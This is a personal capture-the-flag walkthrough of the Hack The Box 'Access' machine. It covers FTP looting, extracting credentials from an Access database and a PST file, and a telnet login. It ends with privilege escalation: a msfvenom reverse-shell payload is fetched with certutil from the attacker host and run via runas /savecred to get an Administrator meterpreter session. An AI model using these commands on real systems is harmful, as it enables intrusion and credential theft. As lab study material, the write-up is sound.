@@ -1,0 +1,340 @@
+Access IP: 10.10.10.98
+
+
+rustscan:
+
+PORT   STATE SERVICE REASON
+21/tcp open  ftp     syn-ack
+23/tcp open  telnet  syn-ack
+80/tcp open  http    syn-ack
+
+
+nmap:
+
+PORT   STATE SERVICE REASON  VERSION
+21/tcp open  ftp     syn-ack Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
+| ftp-syst: 
+|_  SYST: Windows_NT
+23/tcp open  telnet? syn-ack
+80/tcp open  http    syn-ack Microsoft IIS httpd 7.5
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-title: MegaCorp
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+
+
+
+
+
+
+gobuster dir  -u http://10.10.10.98  -w /usr/share/wordlists/dirb/common.txt -t 64                                   
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.98
+[+] Threads:        64
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2023/02/02 04:09:48 Starting gobuster
+===============================================================
+/aspnet_client (Status: 301)
+/index.html (Status: 200)
+===============================================================
+2023/02/02 04:09:54 Finished
+===============================================================
+
+
+log on to ftp service and download the 2 files : 'Access Control.zip'   backup.mdb
+
+use zip2john to get the hash of the password for the zip file
+
+ip2john Access\ Control.zip > hash.txt 
+                                                                                                                                                                                                     
+┌──(kali㉿kali)-[~/Practice/HackTheBox/Access]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
+Cost 1 (HMAC size) is 10650 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:02:27 DONE (2023-02-02 04:22) 0g/s 97430p/s 97430c/s 97430C/s "chinor23"..*7¡Vamos!
+Session completed. 
+
+but we cannot get the password for the file :((
+
+
+Time to turn our attention to backup.mdb file
+
+file backup.mdb                               
+backup.mdb: Microsoft Access Database
+
+
+we can use mdb tools to interract with the backup.mdb
+mdb-tables backup.mdb 
+acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx 
+
+
+we use mdb-export to see the rows of a certain table:
+
+mdb-export backup.mdb auth_user
+id,username,password,Status,last_login,RoleID,Remark
+25,"admin","admin",1,"08/23/18 21:11:47",26,
+27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
+28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
+
+looking at row 27, there seems to be a password there. can we try it on the zip file in order to extract it's contents?
+It works, we now have the uncompressed file
+
+Looking at the extracted file, it seems to be an Outlook folder
+file Access\ Control.pst 
+Access Control.pst: Microsoft Outlook email folder (>=2003)
+
+
+we can use readpst to retrieve the mails inside the folder
+
+readpst Access\ Control.pst 
+Opening PST file and indexes...
+Processing Folder "Deleted Items"
+        "Access Control" - 2 items done, 0 items skipped.
+
+
+Doing this we created a new file Access Constrol.mbox
+
+ls
+'Access Control.mbox'  'Access Control.pst'  'Access Control.zip'   backup.mdb
+
+
+we can read the mbox file with cat
+
+cat Access\ Control.mbox 
+From "john@megacorp.com" Thu Aug 23 19:44:07 2018
+Status: RO
+From: john@megacorp.com <john@megacorp.com>
+Subject: MegaCorp Access Control System "security" account
+To: 'security@accesscontrolsystems.com'
+Date: Thu, 23 Aug 2018 23:44:07 +0000
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+        boundary="--boundary-LibPST-iamunique-168096009_-_-"
+
+
+----boundary-LibPST-iamunique-168096009_-_-
+Content-Type: multipart/alternative;
+        boundary="alt---boundary-LibPST-iamunique-168096009_-_-"
+
+--alt---boundary-LibPST-iamunique-168096009_-_-
+Content-Type: text/plain; charset="utf-8"
+
+Hi there,
+
+ 
+
+The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
+
+ 
+
+Regards,
+
+John
+
+
+--alt---boundary-LibPST-iamunique-168096009_-_-
+Content-Type: text/html; charset="us-ascii"
+
+<html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:w="urn:schemas-microsoft-com:office:word" xmlns:m="http://schemas.microsoft.com/office/2004/12/omml" xmlns="http://www.w3.org/TR/REC-html40"><head><meta http-equiv=Content-Type content="text/html; charset=us-ascii"><meta name=Generator content="Microsoft Word 15 (filtered medium)"><style><!--
+/* Font Definitions */
+@font-face
+        {font-family:"Cambria Math";
+        panose-1:0 0 0 0 0 0 0 0 0 0;}
+@font-face
+        {font-family:Calibri;
+        panose-1:2 15 5 2 2 2 4 3 2 4;}
+/* Style Definitions */
+p.MsoNormal, li.MsoNormal, div.MsoNormal
+        {margin:0in;
+        margin-bottom:.0001pt;
+        font-size:11.0pt;
+        font-family:"Calibri",sans-serif;}
+a:link, span.MsoHyperlink
+        {mso-style-priority:99;
+        color:#0563C1;
+        text-decoration:underline;}
+a:visited, span.MsoHyperlinkFollowed
+        {mso-style-priority:99;
+        color:#954F72;
+        text-decoration:underline;}
+p.msonormal0, li.msonormal0, div.msonormal0
+        {mso-style-name:msonormal;
+        mso-margin-top-alt:auto;
+        margin-right:0in;
+        mso-margin-bottom-alt:auto;
+        margin-left:0in;
+        font-size:11.0pt;
+        font-family:"Calibri",sans-serif;}
+span.EmailStyle18
+        {mso-style-type:personal-compose;
+        font-family:"Calibri",sans-serif;
+        color:windowtext;}
+.MsoChpDefault
+        {mso-style-type:export-only;
+        font-size:10.0pt;
+        font-family:"Calibri",sans-serif;}
+@page WordSection1
+        {size:8.5in 11.0in;
+        margin:1.0in 1.0in 1.0in 1.0in;}
+div.WordSection1
+        {page:WordSection1;}
+--></style><!--[if gte mso 9]><xml>
+<o:shapedefaults v:ext="edit" spidmax="1026" />
+</xml><![endif]--><!--[if gte mso 9]><xml>
+<o:shapelayout v:ext="edit">
+<o:idmap v:ext="edit" data="1" />
+</o:shapelayout></xml><![endif]--></head><body lang=EN-US link="#0563C1" vlink="#954F72"><div class=WordSection1><p class=MsoNormal>Hi there,<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>The password for the &#8220;security&#8221; account has been changed to 4Cc3ssC0ntr0ller.&nbsp; Please ensure this is passed on to your engineers.<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>Regards,<o:p></o:p></p><p class=MsoNormal>John<o:p></o:p></p></div></body></html>
+--alt---boundary-LibPST-iamunique-168096009_-_---
+
+----boundary-LibPST-iamunique-168096009_-_---
+
+
+
+reading through the emails, we find a  username and a password
+ “security” account has been changed to 4Cc3ssC0ntr0ller. 
+
+ we can use telnet to log in
+
+
+  ┌──(kali㉿kali)-[~/Practice/HackTheBox/Access]
+└─$ telnet 10.10.10.98    
+Trying 10.10.10.98...
+Connected to 10.10.10.98.
+Escape character is '^]'.
+USER Welcome to Microsoft Telnet Service 
+
+login: security
+password: 
+
+*===============================================================
+Microsoft Telnet Server.
+*===============================================================
+C:\Users\security>
+
+
+C:\Users\security\Desktop>type user.txt
+21d0bb3ed77adf2dd4d2bc5278a878b8
+
+
+PRIVESC TIME:
+
+C:\Users\security\Desktop>cmdkey /list
+
+Currently stored credentials:
+
+    Target: Domain:interactive=ACCESS\Administrator
+                                                       Type: Domain Password
+    User: ACCESS\Administrator
+
+
+
+this means that administrators key is saved on the local machine we can use runas in order to run everthing as administrator, without the need for a password
+
+
+How to escalate privileges?
+
+1.create an executable payload 
+2.upload it on the machine 
+3.start a listener
+4.execute the payload as administrator
+5.if everything goes well, we should receive a reverse connection as administrator user ( In theory!)
+
+
+1. create an executable payload
+kali㉿kali)-[~/Practice/HackTheBox/Access]
+└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=9001 -f exe -o door.exe      
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: door.exe
+
+2. upload the exec file on the machine
+
+C:\Users\security>certutil -urlcache -split -f "http://10.10.14.14/door.exe" "C:\Users\security\backdoor.exe"
+****  Online  ****
+  0000  ...
+  1c00
+CertUtil: -URLCache command completed successfully.
+C:\Users\security>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 8164-DB5F
+
+ Directory of C:\Users\security
+
+02/02/2023  09:53 AM    <DIR>          .
+02/02/2023  09:53 AM    <DIR>          ..
+08/24/2018  07:37 PM    <DIR>          .yawcam
+02/02/2023  09:53 AM             7,168 backdoor.exe
+08/21/2018  10:35 PM    <DIR>          Contacts
+08/28/2018  06:51 AM    <DIR>          Desktop
+08/21/2018  10:35 PM    <DIR>          Documents
+02/02/2023  09:51 AM               469 door.exe
+08/21/2018  10:35 PM    <DIR>          Downloads
+08/21/2018  10:35 PM    <DIR>          Favorites
+08/21/2018  10:35 PM    <DIR>          Links
+08/21/2018  10:35 PM    <DIR>          Music
+08/21/2018  10:35 PM    <DIR>          Pictures
+08/21/2018  10:35 PM    <DIR>          Saved Games
+08/21/2018  10:35 PM    <DIR>          Searches
+08/24/2018  07:39 PM    <DIR>          Videos
+               2 File(s)          7,637 bytes
+              14 Dir(s)   3,327,643,648 bytes free
+
+
+3. start a listener
+
+msfconsole -q
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 10.10.14.14
+LHOST => 10.10.14.14
+msf6 exploit(multi/handler) > set LPORT 9001
+LPORT => 9001
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.14.14:9001 
+
+
+
+  4. execute the payload as administrator:
+  runas /savecred /noprofile /user:ACCESS\Administrator backdoor.exe
+
+  5.receive a connection as administrator user:
+  [*] Sending stage (200774 bytes) to 10.10.10.98
+[*] Meterpreter session 1 opened (10.10.14.14:9001 -> 10.10.10.98:49161) at 2023-02-02 04:57:22 -0500
+
+meterpreter > getuid
+Server username: ACCESS\Administrator
+meterpreter > 
+meterpreter > ls
+Listing: C:\Users\Administrator\Desktop
+=======================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  282   fil   2018-08-21 17:55:15 -0400  desktop.ini
+100444/r--r--r--  34    fil   2023-02-02 04:07:03 -0500  root.txt
+
+meterpreter > cat root.txt
+a2df4e456843a2ba7a1cf20f22bc2a02
+meterpreter > 
+            
